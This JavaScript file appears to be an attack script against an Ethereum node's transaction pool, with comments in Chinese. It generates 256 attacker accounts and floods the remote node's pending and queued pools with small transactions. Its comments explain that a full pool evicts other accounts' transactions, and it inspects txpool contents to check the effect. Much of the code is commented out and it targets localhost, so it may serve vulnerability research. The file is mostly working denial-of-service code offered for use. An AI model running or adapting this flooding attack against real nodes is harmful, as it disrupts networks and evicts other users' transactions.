const fs = require('fs');
let Web3 = require('web3');

let genKeys = function(){
    let ea = global.ea;
    let privateKey = require('crypto').randomBytes(32).toString('hex');
    let publicKey = ea.web3.eth.accounts.privateKeyToAccount(privateKey.toString('hex'));
    return {
        publicKey : publicKey.address,
        privateKey : privateKey
    }
}
function sleep(time){
    return new Promise(resolve=>{
        setTimeout(function(){
            resolve();
        }, time);
    })
}

let attackFor256 = {
    init : async function(){
        let attackers = [];
        // gen
        // for(var i=0;i<256;i++) {
        //     attackers.push(genKeys());
        // }
        // fs.writeFileSync(`${__dirname}/../example/attacker256.json`, JSON.stringify(attackers));

        attackers = JSON.parse(fs.readFileSync(`${__dirname}/../example/attacker256.json`).toString());
        // 转钱
        // let transPromise = []
        // for(var i=0;i<attackers.length;i++) {
        //     let temp = ea.handle.sendTrans(ea.Config, attackers[i], 1, i);
        //     transPromise.push(temp);
        // }
        // await Promise.all(transPromise);
        await ea.handle.dumpBalance(attackers);
    },
    start : async function(){
        let attackers = JSON.parse(fs.readFileSync(`${__dirname}/../example/attacker256.json`).toString());

        // 压满remote的pending
        async function pushPending(){
            let promise = [];
            for(var account=0;account<attackers.length;account++) {
                // 每个账号转16笔钱给母账号
                for(let k=0;k<16;k++) {
                    let result = ea.handle.sendTrans(attackers[account], ea.Config.attackers[1], 0.000001, k, 22000);
                    promise.push(result);
                }
            }
            await Promise.all(promise);
            return ;
        }

        // 压满remote的queued
        async function pushQueued(){
            let promise = [];
            for(var account=0;account<16;account++) {
                let top = 16;
                // 压16个账号
                for(var i=top;i<top+1;i++) {
                    let result = ea.handle.sendTrans(attackers[account], ea.Config.attackers[1], 0.000001, i, 23000);
                    promise.push(result);
                }
                await sleep(1000);
                top = 17;
                for(var i=top;i<top+64;i++) {
                    let result = ea.handle.sendTrans(attackers[account], ea.Config.attackers[1], 0.000001, i, 23000);
                    promise.push(result);
                }
                await sleep(1000);
                console.log(`done: ${account}`);
            }
            await Promise.all(promise);
            return ;
        }

        // await pushPending();
        // await pushQueued();

        // return ;

        // 用第17个账号骚一下，发17号交易过去。这样就会挤掉1号账号的第16笔交易
        // let top = 16;
        // let res = ea.handle.sendTrans(attackers[16], ea.Config.attackers[1], 0.000001, top, 24000);

        // 然后再用17号账号发18号交易看看。这样会挤掉1号账号的第15笔交易（剩下14笔）
        // let top = 17;
        // let res = ea.handle.sendTrans(attackers[16], ea.Config.attackers[1], 0.000001, top, 24000);
    },

    checkTxPool : async function(){
        let attackers = JSON.parse(fs.readFileSync(`${__dirname}/../example/attacker256.json`).toString());
        let web3 = new Web3(new Web3.providers.HttpProvider("http://localhost:8546"));
        web3.eth.extend({
            property: 'txpool',
            methods: [{
                name: 'content',
                call: 'txpool_content'
            },{
                name: 'inspect',
                call: 'txpool_inspect'
            },{
                name: 'status',
                call: 'txpool_status'
            }]
        });

        let content = await web3.eth.txpool.content();
        let content0 = await ea.web3.eth.txpool.content();
        
        console.log('==============local pending for account-16==============')
        console.log(Object.keys(content0.pending[attackers[16].publicKey]));
        console.log('==============remote pending for account-16==============')
        console.log(Object.keys(content.pending[attackers[16].publicKey]));
        console.log('==============remote queued for account-16==============')
        // console.log(Object.keys(content.queued[attackers[16].publicKey]));

        // for(var i=0;i<attackers.length;i++) {
        //     let pendingLength = Object.keys(content.pending[attackers[i].publicKey]).length;
        //     console.log(`account-${i} length: ${pendingLength}`);
        // }
        
        console.log('==============local==============')
        console.log(Object.keys(content0.pending[attackers[0].publicKey]));
        console.log('==============remote==============')
        console.log(Object.keys(content.pending[attackers[0].publicKey]));

        // console.log('==============local pending for account-0==============')
        // console.log(Object.keys(content0.pending[attackers[0].publicKey]));
        // console.log('==============remote pending for account-0==============')
        // console.log(Object.keys(content.pending[attackers[0].publicKey]));
        // console.log('==============remote queued for account-0==============')
        // console.log(Object.keys(content.queued[attackers[0].publicKey]));
    }
}

async function init(){
    let ea = global.ea;
    let obj = {
        
    }

    /**
     * pending 缓冲区4096，queue 缓冲区1024，满了就会看看哪个账号有16+个交易，有就踢掉一些他的交易。
     * 攻击方式就是创造一大堆攻击账号，然后发16个交易，塞满pending。
     */
    async function test(){
        let promiss = [];
        // ea.handle.dunpNonce(ea.Config.attackers[0]);
        // return ;
        // let result = ea.handle.sendTrans(ea.Config.attackers[0], ea.Config.attackers[1], 0.000001, 0);
        // for(var i=0;i<17;i++) {
        //     let result = ea.handle.sendTrans(ea.Config.attackers[0], ea.Config.attackers[1], 0.000001, i);
        //     promiss.push(result);
        // }
        // let result = await Promise.all(promiss);
        // console.log(result);
        return ;
    }


    let handle = {
        test : test,
        attackFor256 : attackFor256
    }

    obj.handle = handle;

    return obj;
}

module.exports = init;